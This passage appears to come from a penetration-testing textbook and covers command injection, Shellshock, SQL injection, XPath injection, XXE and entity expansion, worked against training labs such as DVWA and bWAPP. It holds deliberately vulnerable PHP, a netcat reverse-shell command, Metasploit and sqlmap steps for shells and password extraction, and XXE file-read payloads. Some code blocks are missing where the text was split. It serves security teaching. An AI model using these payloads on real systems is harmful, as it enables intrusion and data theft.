["```\n<?php \n  $target = $_REQUEST[ 'ip' ]; \n  $cmd = shell_exec( 'ping  -c 3 ' . $target ); \n  $html .= '<pre>'.$cmd.'</pre>'; \n  echo $html; \n?> \n```", "```\nhttp://server/page.php?ip=127.0.0.1;uname -a\n```", "```\nnc -lvp 12345  \n```", "```\nnc.traditional -e /bin/bash 10.7.7.4 12345 \n```", "``` | The single quote metacharacter is used to force the shell to interpret and run the command between the backticks. The following is an example of this command: `**Variable= \"OS version `uname -a`\" && echo $variable**` |\n| `>>` | This character appends the output of the command on the left-hand side to the file named on the right-hand side of the character. The following is an example of this command: `**ls -la >> listing.txt**` |\n| `&#124;` | The single pipe will use the output of the command on the left-hand side as an input to the command specified on the right-hand side. The following is an example of this command: `**netstat -an &#124; grep :22**` |\n\nAs an attacker, you would often have to use a combination of the preceding metacharacters to bypass filters set by the developer in order to have your command injected.\n\n# Exploiting shellshock\n\nThe **shellshock** vulnerability was discovered in September 2014 and assigned the initial CVE identifier 2014-6271\\. Shellshock is an **Arbitrary Code Execution** (**ACE**) vulnerability, and it was considered one of the most serious flaws ever discovered.\n\nThe flaw was found in the way the **Bourne Again Shell** (**bash**) processes environment variables, and it affects a wide range of applications and operating systems that use bash as an interface to the operating system. Code like the DHCP client in most Unix-based systems (including Mac OS X), the command-line terminals, and CGI scripts in web applications were affected. The flaw is triggered when an empty function is set in an environment variable. An empty function looks like this:\n\n```", "```\n\nWhen the bash shell receives the preceding set of characters along with the variable, instead of rejecting the strings, the bash shell accepts it along with the variables that follow it and executes it as a command on the server.\n\nAs you saw when exploiting the command injection flaw earlier, the bash shell is commonly used on web applications, and you will often see backend, middleware, and monitoring web applications passing variables to the bash shell to execute some tasks. An example of the shellshock flaw is shown next, using the vulnerable live CD from PentesterLab ([https://www.pentesterlab.com/exercises/cve-2014-6271](https://www.pentesterlab.com/exercises/cve-2014-6271)).\n\n# Getting a reverse shell\n\nIf you boot a virtual machine using the live CD image, you'll have a minimum system that includes a web server that loads a very simple page that displays system information:\n\n![](img/00118.jpeg)\n\nIf you look at the requests in a proxy, you'll notice one to `/cgi-bin/status`, whose response includes the system's uptime and what looks like the result of a `uname -a` command:\n\n![](img/00119.jpeg)\n\nTo get such information, the status script needs to communicate with the operating system. There is a chance that it is using bash for that, as bash is the default shell for many Unix-based systems and the `User-Agent` header becomes an environment variable when CGI scripts are processed. To test whether there is\u00a0actually\u00a0a command injection, you need to test different versions of the injection. Let's say that you want the target server to ping you back to verify that it is executing commands. Here are some examples using a generic target address. Notice the use of spaces and delimiters:\n\n```", "```\n\nAs part of the testing, you send the request to Burp Suite's Repeater and submit only the\u00a0`() { :;};`\u00a0empty function\u00a0in the `User-Agent` header and get the same valid response as with no injection:\n\n![](img/00120.jpeg)\n\nIf you try to inject commands such as `uname`, `id`, or a single `ping`, you get an error. This means that the header is actually being processed, and you just need to find the right way to send the commands:\n\n![](img/00121.jpeg)\n\nAfter some trial and error, you find the right command. The `ping -c 1 10.7.7.4` command will be executed on the server, and the pings are captured in the attacker's machine through a network sniffer, such as Wireshark:\n\n![](img/00122.jpeg)\n\nNow that you've found the correct injection command, you can try to gain direct shell access to the servers. For this, first set up your listener using Netcat as follows:\n\n```", "```\n\nThen inject the command. This time, you are injecting a more advanced command that will yield a fully interactive shell if successful:\n\n```", "```\n\n![](img/00123.jpeg)\n\nThe bash shell interprets the variable as a command and executes it instead of accepting the variable as a sequence of characters. This looks very similar to the command injection flaw discussed earlier. The major difference here, however, is that the bash shell itself is vulnerable to code injection rather than the website. Since the bash shell is used by many applications, such as DHCP, SSH, SIP, and SMTP, the attack surface is increased to a great extent. Exploiting the flaw over HTTP requests is still the most common way to do it, as bash shell is often used along with CGI scripts.\n\nTo identify CGI scripts in web servers, apart from the analysis of requests and responses using proxies, **Nikto** and **DIRB** can also be used.\n\n# Exploitation using Metasploit\n\nLaunch the Metasploit console from Terminal (`msfconsole`). You need to select the `apache_mod_cgi_bash_env_exec` exploit under `exploit/multi/http`:\n\n```", "```\n\nThen you need to define the remote host and target URI value using the `set` command. You also need to select the `reverse_tcp` payload that will make the web server connect to the attacker's machine. This can be found by navigating to\u00a0linux | x86 | meterpreter.\n\nMake sure that the localhost (`SRVHOST`) and local port (`SRVPORT`) values are correct. You can set these and other values using the `set` command:\n\n```", "```\n\nUsing the\u00a0`0.0.0.0`\u00a0host, the server will listen through all of the network interfaces enabled by the attacker. Also, verify that there are no services already running on the port selected of the attacker's machine:\n\n![](img/00124.jpeg)\n\nOnce you are ready, enter `exploit`, and you will be greeted by a `meterpreter` prompt if the server is vulnerable to shellshock. *A shell is the most valuable possession of a hacker*. The `meterpreter` session is a very useful tool during the post-exploitation phase. During this phase, the hacker truly understands the value of the machine that they have compromised. Meterpreter has a large collection of built-in commands.\n\nMeterpreter is an advanced remote shell included in Metasploit. When executed in Windows systems, it includes modules to escalate privileges, dump passwords and password hashes, impersonate users, sniff network traffic, log keystrokes, and perform many other exploits in the target machine.\n\nThe following screenshot shows the output of the `sysinfo` command and a remote system shell within Meterpreter:\n\n![](img/00125.jpeg)\n\n# SQL injection\n\nInteracting with a backend database to retrieve and write data is one of the most critical tasks performed by a web application. Relational databases that store the data in a series of tables are the most common way to accomplish this, and for querying information, **Structured Query Language** (**SQL**) is the de facto standard.\n\nIn order to allow users to select what information to see or to filter what they can see according to their profiles, the input taken from cookies, input forms, and URL variables is used to build SQL statements that are passed back to the database for processing. As user input is involved in building the SQL statement, the developer of the application needs to validate it carefully before passing it to the backend database. If this validation is not properly done, a malicious user may be able to send SQL queries and commands that will be executed by the database engine instead of being processed as the expected values.\n\nThe type of attacks that abuse the trust of user input in order to force the server to execute SQL queries instead of using the values as filtering parameters is called **SQL injection**.\n\n# An SQL primer\n\nIn order to understand the SQL injection flaw, initially you need to have some knowledge of SQL. First, let's look at some basic database concepts:\n\n*   **Column or field:** A column or field is one particular piece of data referring to a single characteristic of all entities, such as username, address, or password.\n*   **Row or record:** A row or record is a set of information, or group of field values, related to a single entity, for example, the information related to a single user or a single client.\n*   **Table:** A table is a list of records containing information about the same type of elements, for example, a table of users, products, or blog posts.\n*   **Database:** A database is the whole set of tables associated with the same system or group of systems and usually related to each other. For example, an online store database may contain tables of clients, products, sales, prices, suppliers, and staff users.\n\nTo get information for such a complex structure, almost all modern programming languages and **Database Management Systems** (**DBMS**) support the use of SQL. SQL allows the developer to perform the following actions on the database:\n\n| **Statement** | **Description** |\n| --- | --- |\n| `CREATE` | This is used to create databases and tables |\n| `SELECT` | This allows information to be retrieved from the database |\n| `UPDATE` | This allows modification of existing data in the database |\n| `INSERT` | This allows the insertion of new data in the database |\n| `DELETE` | This is used to remove records from the database |\n| `DROP` | This is used to delete tables and databases permanently |\n\nOther more sophisticated functionalities, such as stored procedures, integrity checks, backups, and filesystem access are also supported, and their implementation is mostly dependent on the DBMS used.\n\nMost of the legitimate SQL operative tasks are performed using the preceding statements. The `DELETE` and `DROP` statements, however, can cause the loss of information if their usage is not controlled. In penetration testing, attempting SQL Injection attacks with `DROP` or `DELETE` is discouraged, or should I say forbidden, unless explicitly required by the client.\n\nThe `;`\u00a0(semicolon) metacharacter in a SQL statement is used similarly to how it's used in command injection to combine multiple queries on the same line.\n\n# The SELECT statement\n\nThe basic operation in day-to-day database use is retrieval of information. This is done with `SELECT`. The basic syntax is as follows:\n\n```", "```\n\nHere,\u00a0`elements` can be a wildcard (for example, `*` to select everything), or the list of columns you want to retrieve. `table` is the table(s) from which you want to retrieve the information. The `WHERE` clause is optional, and if used, the query will only return the rows that fulfill the condition. For example, you can select the `name`, `description`, and `price` columns of all products below $100 (USD):\n\n```", "```\n\nThe `WHERE` clause can also use Boolean operators to make more complex conditions:\n\n```", "```\n\nThe preceding SQL statement will return the values in `columnA` from a table named `tableX` if the condition following the `WHERE` clause is satisfied; that is, `columnE` has a\u00a0`employee`\u00a0string value\u00a0and `columnF` has the\u00a0`100`\u00a0value.\n\n# Vulnerable code\n\nSimilar to the command injection flaw discussed earlier, the variable passed using the `GET` method is also often used to build a SQL statement. For example, the\u00a0`/books.php?userinput=1`\u00a0URL\u00a0will display information about the first book.\n\nIn the following PHP code, the input provided by the user via the `GET` method is directly added to the SQL statement. The `MySQL_query()` function will send the SQL query to the database and the `MySQL_fetch_assoc()` function will fetch the data in an array format from the database:\n\n```", "```\n\nWithout proper input validation, the attacker can take control over the SQL statement. If you change the URL to `/books.php?userinput=10-1`, the following query will be sent to the backend database:\n\n```", "```\n\nIf the information about the ninth book is displayed, you can conclude that the application is vulnerable to a SQL injection attack because the unfiltered input is sent directly to the database that is performing the subtraction.\n\nThe SQL injection flaw exists in the web application, not on the database server.\n\n# SQL injection testing methodology\n\nIn the previous section, you witnessed the results of an attack on a vulnerable piece of code. It's very evident that if the user input is used without prior validation, and it is concatenated directly into a SQL query, a user can inject different values or code that will be processed and executed by the SQL interpreter in the database. But, what if you don't have access to the source code? This is the most likely scenario in penetration testing; so, how do you identify such a flaw?\n\nThe answer is by trying out simple injection strings and analyzing the server's response. Let's look at a simple example using **Damn Vulnerable Web Application** (**DVWA**). In the SQL Injection section, if you input any number in the textbox, for example a `2`, you get the information for a user with this ID:\n\n![](img/00126.jpeg)\n\nNow try submitting an\u00a0`'`\u00a0(apostrophe) character instead of a number, and you'll see that the response is a very descriptive error message:\n\n![](img/00127.jpeg)\n\nThis sole response tells us that the parameter is vulnerable to injection, as it indicates a syntax error on the submission of the ID, the query formed by injecting the apostrophe would be as follows:\n\n```", "```\n\nThe opening apostrophe is closed by the injected character. The one already in the code is left open, and this generates an error when the DBMS tries to interpret the sentence.\n\nAnother way of detecting an injection is to make the interpreter perform a Boolean operation. Try submitting something like `2' and '1'='1`. Note that you are not sending the first and last apostrophes\u2014these will be completed by the ones already in the SQL sentence, as it is deducted from the previous error message. Sometimes, you will need to try multiple combinations with and without apostrophes, parentheses, and other grouping characters to discover how the sentence is actually done:\n\n![](img/00128.jpeg)\n\nThe result is the same user with ID=2\\. This is the expected result, as you are appending an always true condition; that is, `and '1'='1'`.\n\nNext, try an always false one: `2' and '1'='2`:\n\n![](img/00129.jpeg)\n\nFrom the address bar in the browser, you can see that the ID submission is done through a `GET` request. The response for a false condition is empty text instead of the user's details. Thus, even when the user with ID=2 exists, the second condition of the sentence is false and the result is empty. This indicates that you can inject SQL code into the query and possibly extract information from the database.\n\nOther useful test strings that may help you to identify a SQL injection are as follows:\n\n*   **Arithmetic operations on numeric inputs**: These include, `2+1`, `-1`, and\u00a0`0+1`.\n*   **Alphabetic values**: Use these (`a`, `b`, `c`, ...) when numbers are expected.\n*   **Semicolon (;)**: In most SQL implementations, a semicolon indicates the end of a sentence. You can inject a semicolon followed by another SQL sentence such as `SLEEP` or `WAITFOR` and then compare the response time. If it is consistent with the pause you provided, there is an injection vulnerability.\n*   **Comments**: A comment mark (`#`, `//`, `/*`, `--`) makes the interpreter ignore everything after the comment. By injecting these after a valid value, you should have a different response than when submitting the value alone.\n*   **Double quotes (\")**: This can be used instead of apostrophes or single quotes to delimit strings.\n\n*   **Wildcards, characters % (percent) and _ (underscore)**: These can also be used in `WHERE` conditions, hence you can inject them if the code is vulnerable; `%` means all strings and `_` means any character, but just one character. For example, if the `LIKE` operator is used instead of `=`, as in the following PHP string concatenation, if we submit the percent character (`%`) you will get all of the users as a result:\n\n```", "```\n\nAlternatively, if you submit something such as\u00a0`\"Ali__\"` (with two underscores) , you may get results such as `\"Alice\"`, `\"Aline\"`, `\"Alica\"`, `\"Alise\"`, and\u00a0`\"Alima\"`.\n\n*   **UNION operator**: This is used in SQL to put together the results of two queries. As a condition, the results of both the queries need to have the same number of columns. Thus, if you have a vulnerable query that returns three, like the one just shown (selecting two columns) and inject something like `UNION SELECT 1,2`, you will have a valid result, or you will get an error if you inject `UNION SELECT 1,2,3`. If the result is the same, no matter the number of columns, or the differences are not consistent, that input may not be vulnerable.\n\n# Extracting data with SQL injection\n\nIn order to take advantage of an SQL injection vulnerability and extract data from a database, the first thing that you need to do is to understand how the query is built, so you know how and where to inject your payloads.\n\nFinding out that there is an injection vulnerability helps you figure out how the `WHERE` condition is made. Another thing that you need to know is how many columns are selected and which ones are actually returned to the client.\n\nTo get the number of columns, you can use `ORDER BY`. Start by injecting `ORDER BY 1` after the valid value to order the results by the first row, then by the second row, and so on until you get an error because you are trying to order the results using a nonexistent row number:\n\n![](img/00130.jpeg)\n\nAs can be seen in the preceding screenshot, the query fails when ordering by column `3`, which tells you that it is returning only two columns. Also, notice in the address bar that your injection was `2' order by 3 -- '` and you need to add a comment to make the interpreter ignore the rest of the query because in SQL `ORDER` must always be at the end of the sentence. You also need to add spaces before and after the comments (the browser replaces them with `+` in the address bar) and close the single quotes at the end to prevent syntax errors.\n\nNow that you know that the query returns two columns, to see how they are presented in the response, use `UNION`. By submitting `2' union select 1,2 -- '`, you will see that the first column is the first name and the second column is the last name:\n\n![](img/00131.jpeg)\n\nNow you can start extracting information from the database.\n\n# Getting basic environment information\n\nIn order to extract information from the database, you need to know what to look for: What are the databases? To which of them does our user have access? What tables are there, and what columns do they have? This is the initial information that you need to ask the server in order to be able to query for the data that you wish to obtain:\n\n![](img/00132.jpeg)\n\nUsing the DVWA example, given that you have only two columns to get the information, start by asking the database name and the user used by the application to connect to the DBMS.\n\nThis is done using the `database()` and `user()` functions predefined in MySQL:\n\n![](img/00133.jpeg)\n\nYou can also ask for the list of databases on the server by injecting the following:\n\n```", "```\n\n![](img/00134.jpeg)\n\n`information_schema` is the database that contains all of the configuration and database definition information for MySQL, so `dvwa` should be the database corresponding to the target application. Now let's query for the tables contained in that database:\n\n```", "```\n\nAs can be seen in the screenshot, we are querying the table name of all of the tables defined in the `information_schema.tables` table, for which,\u00a0`table_schema` (or database name) is `'dvwa'`. From there, you get the name of the table containing the information of users and you can also ask for its columns and the type of each column:\n\n```", "```\n\nYou should select one or two pieces of information on each request because you have only two fields to display information. SQL provides the `CONCAT` function, which concatenates two or more strings. You can use it to put together multiple fields in a single value. You will use `CONCAT` to extract user ID, first and last names, username, and password in a single query:\n\n```", "```\n\n**![](img/00135.jpeg)**\n\n# Blind SQL injection\n\nSo far, we have identified and exploited a common SQL injection vulnerability, where the requested information is displayed in the server's response. There is a different type of SQL injection, however, where the server responses don't reveal the actual detailed information, irrespective of whether or not it exists. This is called **blind SQL injection**.\n\nTo detect a blind SQL injection, you need to form queries that get yes or no responses. This means that a query responds in a consistent way when the result is either positive or negative so that you can distinguish one from the other. This can be based on the response's contents, the response code, or the execution of certain injected commands. Within this last category, the most common method is to inject pause commands and detect true or false based on the response time (time-based injection). To clarify this, let's do a quick exercise with DVWA. You will also use Burp Suite to facilitate the resubmission of requests.\n\nIn a time-based injection, a query is formed aiming to pause the processing *N* seconds if the result is true, and executing the query without pause if the result is false. To do this, use the `SLEEP(N)`\u00a0function\u00a0in MySQL and the\u00a0`WAITFOR DELAY '0:0:N'`\u00a0function in MS SQL Server. If the server takes this time to respond, the result is true.\n\nFirst, go to SQL Injection (Blind). You'll see the same User ID textbox from the other SQL injection exercise. If you submit a number, it shows the first and last name for the corresponding user. This time, however, instead of showing an error, if you submit an apostrophe or single quote, it shows an empty response. But what happens if you submit `1''`? It shows the information of user 1; so it is injectable:\n\n**![](img/00136.jpeg)** \n\nLet's review the information you now have. There is a valid user with ID=1\\. If you submit an incorrect query or a user that doesn't exist, the result is just an empty information space. Then there are true and false states. You can test these by submitting `1' and '1'='1 and 1' and '1'='2`:\n\n**![](img/00137.jpeg)**\n\nThe false response is shown in the following screenshot. Notice how some characters are encoded in the address bar of the browser (for example, `'='` is encoded to `'%3D'`):\n\n![](img/00138.jpeg)\n\nTo ask yes/no questions, you must replace `'1'='1'` with a query that should return true or false. You already know that the application's database name is `'dvwa'`. Now submit the following:\n\n![](img/00139.jpeg)\n\n```", "```\n\nYou get a positive response here. Remember that you don't include the first and last quotes because they are already in the application's code. How do you know that? You need to iterate character by character to find each letter, asking questions such as, \"Does the current database name starts with a `?`.\" This can be done one character at a time through the form or Burp's Repeater, or it can be automated with Burp's Intruder.\n\nSend a valid request from the proxy history to Intruder, and set the inputs as shown in the following screenshot:\n\n![](img/00140.jpeg)\n\nNotice how after `a`\u00a0is set as input, there is `%25`. This is the URL encoded `%`\u00a0(percent)\u00a0character. URL encoding is done automatically by the browser, and it is sometimes necessary for the server to interpret the characters sent right way. Encoding can also be used to bypass certain basic validation filters. The percent character, as mentioned before, is a wildcard that matches any string. Here we are saying if the user ID is `1`, the current database's name starts with `a`, and it's followed by anything; the payload list will be all of the letters in the alphabet and the numbers from 0 to 9\\. SQL string comparison is case insensitive, unless specifically done otherwise. This means `A` is the same as `a`:\n\n![](img/00141.jpeg)\n\nYou now have the input position and the payloads, but how will you separate the true responses from the false ones? You will need to match some string in either the true or the false result. You know that the true response always contains the\u00a0`First name`\u00a0text, as it shows the user's information. We can make a Grep - Match rule for that:\n\n![](img/00142.jpeg)\n\nNow start the attack, and see that `d` matches with a true response:\n\n![](img/00143.jpeg)\n\nTo find the second character, just prepend `d` (the result) to the input position:\n\n![](img/00144.jpeg)\n\nStart the attack again, and you'll see that `v` is the next character:\n\n![](img/00145.jpeg)\n\nContinue this process until none of the possible inputs return a positive response. You can also construct the first round of queries to obtain the length of the name using the following injection and iterate the last number until the correct length value is found:\n\n```", "```\n\nRemember, as Intruder doesn't add encoding as the browser does, you may need to add it yourself or configure it in the payload configuration. Here we replaced all spaces with the\u00a0`+` symbols. Also, notice that as the `char_length()` return value is an integer, you need to add the comments and close the quotes after that.\n\nAn excellent reference on useful SQL commands for SQL injection in the most common DBMS can be found on PentestMonkey's SQL injection cheat sheet at\u00a0[http://pentestmonkey.net/category/cheat-sheet/sql-injection](http://pentestmonkey.net/category/cheat-sheet/sql-injection).\n\n# Automating exploitation\n\nAs you can see from the previous section, exploiting SQL injection vulnerabilities can be a tricky and time-consuming task. Fortunately, there are some helpful tools available for penetration testers to automate the task of extracting information from vulnerable applications.\n\nEven if the tools presented here can be used not only to exploit but also to detect vulnerabilities, it is not recommended that you use them in that manner, as their fuzzing mechanism generates high volumes of traffic; they cannot be easily supervised, and you will have limited control on the kinds of requests they make to the server. This increases the damage risk to the data and makes it more difficult to diagnose an incident, even if all logs are kept.\n\n# sqlninja\n\nThe **sqlninja** tool can help you exploit SQL injection flaws in an application using the Microsoft SQL server as the backend database. The ultimate goal of using the sqlninja tool is to gain control over the database server through a SQL injection flaw. The sqlninja tool is written in Perl, and it can be found in Kali by navigating to\u00a0Applications | Database Assessments. The sqlninja tool cannot be used to detect the existence of an injection flaw, but rather to exploit the flaw to gain shell access to the database server. Here are some of the important features of sqlninja:\n\n*   For fingerprinting the remote SQL server to identify the version, user privileges, database authentication mode, and `xp_cmdshell` availability\n*   For uploading executables on target via SQLi\n*   For integration with Metasploit\n*   It uses the WAF and IPS evasion techniques by means of obfuscated code\n*   For Shell tunneling using DNS and ICMP protocols\n*   For brute forcing of the\u00a0`sa` password on older versions of MS SQL\n\nThe sqlninja tool, similar to sqlmap, can be integrated with Metasploit, which you can use to connect to the target server via a `meterpreter` session when the tool exploits the injection flaw and creates a local shell. All of the information that sqlninja needs is to be saved in a configuration file. A sample configuration file in Kali Linux is saved in `/usr/share/doc/sqlninja/sqlninja.conf.example.gz`. You will need to extract it using the `gunzip` command. You can edit the file using Leafpad, and save the HTTP request in it by exporting it from a proxy such as Burp. You also need to specify the local IP address to which the target will connect. A detailed, step-by-step HTML guide is included with the tool, and it can be found at the same location as the config in a file named as `sqlninja-how.html`.\n\nThe configuration file looks similar to the one shown in the following screenshot. `--httprequest_start--` and `--httprequest_end--` are markers, and they have to be defined at the start and end of the HTTP request:\n\n![](img/00146.jpeg)\n\nThe `sqlninja`\u00a0tool includes several modules, as shown in the following screenshot. Each of them has been created with the goal of gaining access to the server using different protocols and techniques:\n\n![](img/00147.jpeg)\n\nTo start the exploitation, enter the following:\n\n```", "```\n\nThe sqlninja tool will now start injecting SQL queries to exploit, and it will return a `meterpreter` session when done. Using this, you can gain complete control over the target. The database system being such a critical server on the network is always the most attractive target for a malicious attacker. Tools such as sqlninja help you understand the seriousness of the SQL injection flaw before your adversaries attack it. An attacker gaining shell access to the database server is the last thing that you want to see as an IT security professional.\n\n# BBQSQL\n\nKali Linux includes a tool specifically created to exploit a blind SQL injection flaw. **BBQSQL** is a tool written in Python. It's a menu-driven tool that asks several questions and then builds the injection attack based on your responses. It is one of the faster tools that can automate the testing of a blind SQL injection flaw with great accuracy.\n\nThe BBQSQL tool can be configured to use either a binary or frequency search technique. It can also be customized to look for specific values in the HTTP response from the application in order to determine if the SQL injection worked.\n\nAs shown in the following screenshot, the tool provides a nice menu-driven wizard. The URL and the parameters are defined in the first menu and output file, and the technique used and response interpretation rules are defined in the second menu:\n\n![](img/00148.jpeg)\n\n# sqlmap\n\nThe **sqlmap**\u00a0tool is perhaps the most complete SQL injection tool available now. It automates the process of discovering a SQL injection flaw, accurately guessing the database type and exploiting the injection flaw to take control over the entire database server. It can also be used as a remote shell once the injection is exploited, or it can trigger a Metasploit payload (such as Meterpreter) for more advanced access.\n\nSome of the features of sqlmap are as follows:\n\n*   It provides support for all major database systems\n*   It is effective on both error-based and blind SQL injection\n*   It can enumerate table and column names and also extract user and password hashes\n*   It supports downloading and uploading of files by exploiting an injection flaw\n*   It can use different encoding and tampering techniques to bypass defensive mechanisms such as filtering, WAFs, and IPS\n*   It can run shell commands on the database server\n*   It can integrate with Metasploit\n\nIn Kali Linux, sqlmap can be found by navigating to\u00a0Applications | Database Assessment. To use the tool, you first need to find an input parameter that you want to test for SQL injection. If the variable is passed through the `GET` method, you can provide the URL to the sqlmap tool, and it will automate the testing. You can also explicitly tell sqlmap to test only specific parameters with the `-p` option. In the following example, we are testing the\u00a0`username`\u00a0variable\u00a0for an injection flaw. If it's found to be vulnerable, the `--schema` option will list the contents of the information schema database. This is the one that contains the information about all databases and their tables:\n\n```", "```\n\n![](img/00149.jpeg)\n\nIf the parameter to be injected is passed using the `POST` method, an HTTP file can be provided as an input to `sqlmap`, which contains the header and the parameter. The HTTP file can be generated using a proxy such as Burp, by copying the data displayed under the Raw tab when the traffic is captured.\n\nThe file would be similar to the one shown in the following screenshot:\n\n![](img/00150.jpeg)\n\nThe HTTP file can then be provided as an input to `sqlmap`. The `--threads` option is used to select the number of concurrent HTTP requests to the application. The `--current-db` option will extract the database name used by the application, and `--current-user` extracts the name of the user, whom the application connects to the database:\n\n```", "```\n\nThis command results in the following output. The name of the database is `PUBLIC`\u00a0and that of the user is `SA`:\n\n![](img/00151.jpeg)\n\nAfter the database name is identified, the `--tables` and `--columns` options can be used to extract information about tables and columns. Also, the\u00a0`--data`\u00a0option\u00a0can be used to define the\u00a0`POST` parameters instead of using a file containing the request. Notice the use of\u00a0`\"`\u00a0(quotes); they are used to make the Linux shell interpret the whole set of parameters as a single string and escape the\u00a0`&`\u00a0(ampersand) character, as it is a reserved operator in the command lines of\u00a0Unix systems:\n\n```", "```\n\nYou will see the following output:\n\n![](img/00152.jpeg)\n\nTo extract all the data from certain tables, we use the `--dump` option plus `-D`, to specify the database and `-T`, to specify the table:\n\n```", "```\n\nLet's look at an example of the output:\n\n![](img/00153.jpeg)\n\nThe attacker's objective would be to use the SQL injection flaw to gain a further foothold on the server. Using sqlmap, you can read and write files on the database server by exploiting the injection flaw, which invokes the `load_file()` and `out_file()` functions on the target to accomplish it. In the following example, we are reading the contents of the `/etc/passwd` file on the server:\n\n```", "```\n\n![](img/00154.jpeg)\n\nA few additional options provided by the `sqlmap` tool are shown in the following table:\n\n| **Option** | **Description** |\n| --- | --- |\n| `-f` | This performs an extensive fingerprint of the database |\n| `-b` | This retrieves the DBMS banner |\n| `--sql-shell` | This accesses the SQL shell prompt after successful exploitation |\n| `--schema` | This enumerates the database schema |\n| `--comments` | This searches for comments in the database |\n| `--reg-read` | This reads a Windows registry key value |\n| `--identify-waf` | This identifies WAF/IPS protection |\n| `--level N` | This sets the scan level (amount and complexity of injected variants) to `N` (1-5) |\n| `--risk N` | This sets the risk of requests (1-3); Level 2 includes heavy time-based requests; Level 3 includes OR-based requests |\n| `--os-shell` | This attempts to return a system shell |\n\nAn extensive list of all of the options that you can use with sqlmap can be found at this GitHub project page,\u00a0[https://github.com/sqlmapproject/sqlmap/wiki/Usage](https://github.com/sqlmapproject/sqlmap/wiki/Usage).\n\n# Attack potential of the SQL injection flaw\n\nThe following are techniques used to manipulate the SQL injection flaw:\n\n*   By altering the SQL query, the attacker can retrieve extra data from the database that a normal user is not authorized to access\n*   Run a DoS attack by deleting critical data from the database\n*   Bypass authentication and perform privilege escalation attacks\n*   Using batched queries, multiple SQL operations can be executed in a single request\n*   Advance SQL commands can be used to enumerate the schema of the database and then alter the structure too\n*   Use the `load_file()` function to read and write files on the database server and the `into outfile()` function to write files\n*   Databases such as Microsoft SQL allow OS commands to run through SQL statements using `xp_cmdshell`; an application vulnerable to SQL injection can allow the attacker to gain complete control over the database server and also attack other devices on the network through it\n\n# XML injection\n\nThis section will cover two different perspectives on the use of XML in web applications:\n\n*   When the application performs searches in an XML file or XML database\n*   When the user submits XML formatted information to be parsed by the application\n\n# XPath injection\n\n**XPath** is a query language for selecting nodes from an XML document. The following is the basic XML structure:\n\n```", "```\n\nAn XPath search for **element** can be represented as follows:\n\n```", "```\n\nMore complex expressions can be made, for example, an XPath query for a login page may look like the following:\n\n```", "```\n\nAs with SQL, if the input from the user is taken as is and concatenated to a query string, such input may be interpreted as code instead of data parameters.\n\nFor example, let's look at bWapp's XML/XPath Injection (Search) exercise. It shows a drop box, where you can choose a genre and search for movies that match this genre:\n\n![](img/00155.jpeg)\n\nHere,\u00a0`genre` is an input parameter for some search that the application does on the server side. To test it, you will need to create a search while having the browser first identify the request that sends the `genre` parameter to the server (`/bWAPP/xmli_2.php?genre=action&action=search`), and then send it to Repeater. You will do this using a proxy such as Burp Suite or ZAP. Once in Repeater, add a single quote to the genre. Then, click on\u00a0Go and analyze the response:\n\n![](img/00156.jpeg)\n\nBy adding a single quote, we caused a syntax error in the application shown in the response. It clearly indicates that XPath is being used. Now you need to know how the query is constructed. For starters, let's see whether it looks for the whole text or part of it. Remove the last letters of the genre and click on\u00a0Go:\n\n![](img/00157.jpeg)\n\nYou can see that if you use only a part of the genre, you still get the same results as when using the complete word. This means that the query is using the\u00a0`contains()` function. You can look at the source code in [https://github.com/redmondmj/bWAPP](https://github.com/redmondmj/bWAPP), as it is an open source application. Let's take the black box approach, however; so, it may be something like the following:\n\n```", "```\n\nThough you may not know the full query, you can have a high level of confidence that `[contains(genre, '$genre_input')]` or something very similar is in place.\n\nNow try a more elaborate injection that attempts to retrieve all of the records in the XML file that you inject:\n\n```", "```\n\n![](img/00158.jpeg)\n\nYou can see that the response contains much more information than the original query, and the application will not show some of this information as part of a normal search.\n\n# XPath injection with XCat\n\n**XCat** is a tool written in Python 3, which can help you retrieve information using XPath injection vulnerabilities. It is not included by default in Kali Linux, but it can easily be added. You need to have Python 3 and pip installed in Kali Linux, and then just run the following in Terminal:\n\n```", "```\n\nOnce XCat is installed, you need to be authenticated in bWAPP to get the vulnerable URL and cookie, so you can issue a command with the following structure:\n\n```", "```\n\nIn this case, the command would be as follows:\n\n```", "```\n\nNotice that we use `\">1<\"` as the true string. This is because the number in the results table only appear when at least one result is found. Running that command against bWAPP will result in something like the following:\n\n![](img/00159.jpeg)\n\n# The XML External Entity injection\n\nIn XML, an **entity** is a storage unit that can be internal or external. An internal entity is one that has its value defined in its declaration, and an external entity takes the value from an external resource, such as a file. When an application receives some input from the user in XML format and processes external entities declared within it, it is vulnerable to the\u00a0**XML External Entity** (**XXE**) injection.\n\nWe'll use bWAPP again to put this into practice using the XEE exercise in\u00a0/A7 - Missing Functional Level Access Control/. There you will see only text with a button, and nothing seems to happen when you click on it. Let's check the proxy's recorded requests, however:\n\n![](img/00160.jpeg)\n\nThus, here you are sending an XML structure containing your username and some secret. You send the request to Repeater to analyze it further and to test it. First, try to create an internal entity and see if the server processes it. To do this, submit the following XML:\n\n```", "```\n\n![](img/00161.jpeg)\n\nHere we created an entity called `internal-entity` with the\u00a0`\"boss\"`\u00a0value, and then we used that entity to replace the login value, which was reflected in the response. This means that whatever you load through that entity will be processed and reflected by the server.\n\nTry loading a file as follows:\n\n```", "```\n\n![](img/00162.jpeg)\n\nUsing `SYSTEM`, you are defining an external entity. This loads a file (`/etc/passwd`), and the server displays the result in its response.\n\nIf the parser is not properly configured, and the `expect` PHP module is loaded, you can also gain remote execution through XEEs:\n\n```", "```\n\n# The Entity Expansion attack\n\nEven if external entities are not allowed by the parser, the permitting of internal entities can still be exploited by a malicious user and cause a disruption in the server. As all XML parser replaces entities with their defined values, a set of recursive entities can be created so that the server can process a huge amount of information until it is unable to respond.\n\nThis is called an **Entity Expansion attack**. The following structure is a simple proof of concept:\n\n```", "```\n\n![](img/00163.jpeg)\n\nHere, you can see what will happen when `entity5` is loaded. All of the other entities will also be loaded. This information is stored in the server's memory while being processed, so if you send a payload big enough or a recursion deep enough, you may cause the server to run out of memory and be unable to respond to a users' requests.\n\nNow let's see how the response's size changes when loading `entity5`:\n\n![](img/00164.jpeg)\n\nIt is important to remember that, when doing penetration testing on real applications, these kinds of tests must be conducted with extreme caution and only up to the point where you can demonstrate that the vulnerability exists without causing disruptions to the service, unless otherwise specified by the client. In this case, a special environment and special logging and monitoring measures should be taken. As for Entity Expansion attacks, demonstrating a recursion of six or seven levels can be enough as a proof of concept. Response times should also be taken into consideration.\n\n# NoSQL injection\n\nIn recent years, **Big Data**, or the storage, processing, and analysis of enormous amounts of information in various versions and with various purposes is being increasingly promoted and implemented in companies of different sizes. This kind of information is usually nonstructured or derived from sources that are not necessarily compatible. Thus, it 